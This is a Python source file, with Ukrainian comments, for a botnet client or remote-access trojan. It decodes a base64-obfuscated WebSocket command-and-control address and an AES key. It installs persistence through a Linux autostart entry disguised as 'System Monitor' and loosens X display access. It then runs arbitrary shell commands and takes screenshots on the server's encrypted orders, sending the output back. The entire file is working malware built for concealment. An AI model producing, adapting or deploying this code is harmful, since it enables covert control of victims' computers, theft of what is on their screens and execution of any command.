import asyncio
import websockets
import sys
import subprocess
import os
import base64
import uuid
from io import BytesIO

# Динамічний імпорт для приховування залежностей
def _imp(name):
    try:
        return __import__(name)
    except ImportError:
        return None

crypto_lib = _imp("Crypto.Cipher") or _imp("Cryptodome.Cipher")
AES = crypto_lib.AES if crypto_lib else None
PIL_IG = _imp("PIL.ImageGrab")

# --- ЗАМАСКОВАНІ КОНФІГУРАЦІЇ ---
# Тепер IP та Ключ не лежать у відкритому тексті
_S = "d3M6Ly8xOTIuMTY4LjEwLjgyOjgwMDAvd3Mv" # Base64 від ws://192.168.10.82:8000/ws/
_K = "QU1ZX0JPVE5FVF8yMDI2X1NFQ1VSRV9LRVlfVjJfMzI=" # Base64 від ключа

def get_cfg(val): return base64.b64decode(val)
def get_bot_id(): return f"bot_{hex(uuid.getnode())[2:10]}"

def dec(encoded: str):
    try:
        raw = base64.b64decode(encoded)
        c = AES.new(get_cfg(_K), AES.MODE_GCM, nonce=raw[:16])
        return c.decrypt_and_verify(raw[32:], raw[16:32]).decode('utf-8')
    except: return None

def enc(msg: str):
    c = AES.new(get_cfg(_K), AES.MODE_GCM)
    ct, tag = c.encrypt_and_digest(msg.encode('utf-8'))
    return base64.b64encode(c.nonce + tag + ct).decode('utf-8')

def persistence():
    """Приховане закріплення"""
    try:
        path = os.path.abspath(sys.argv[0])
        if sys.platform != "win32":
            d = os.path.expanduser("~/.config/autostart/")
            os.makedirs(d, exist_ok=True)
            f = os.path.join(d, "sys_monitor.desktop")
            if not os.path.exists(f):
                with open(f, "w") as out:
                    out.write(f"[Desktop Entry]\nType=Application\nExec=python3 {path}\nName=System Monitor\n")
    except: pass

async def start():
    persistence()
    b_id = get_bot_id()
    if sys.platform != "win32":
        os.environ["DISPLAY"] = ":0"
        subprocess.run(["xhost", "+local:root"], capture_output=True)

    while True:
        try:
            async with websockets.connect(get_cfg(_S).decode() + b_id) as ws:
                while True:
                    m = await ws.recv()
                    cmd = dec(m)
                    if not cmd: continue

                    if cmd.startswith("shell:"):
                        r = subprocess.run(cmd[6:], shell=True, capture_output=True, text=True)
                        ans = (r.stdout + r.stderr) or "Done."
                    elif cmd == "screenshot":
                        if PIL_IG:
                            buf = BytesIO()
                            PIL_IG.ImageGrab.grab().save(buf, format="PNG")
                            ans = f"SCREENSHOT:{base64.b64encode(buf.getvalue()).decode()}"
                        else: ans = "Err: No PIL"
                    else: ans = f"Unknown: {cmd}"
                    
                    await ws.send(enc(ans))
        except: await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(start())